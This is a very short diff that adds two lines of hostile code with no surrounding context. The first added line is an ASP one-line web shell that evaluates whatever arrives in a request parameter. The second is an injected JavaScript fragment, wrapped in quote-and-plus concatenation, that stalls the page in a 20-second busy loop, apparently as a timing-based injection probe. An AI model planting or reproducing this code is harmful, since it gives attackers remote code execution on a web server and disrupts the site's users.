@@ -1,0 +1,2 @@
+ <%eval request("yjzyxx!")%> 
+'+(function(){if(typeof a0d79==="undefined"){var a=new Date();do{var b=new Date();}while(b-a<20000);a0d79=1;}}())+'
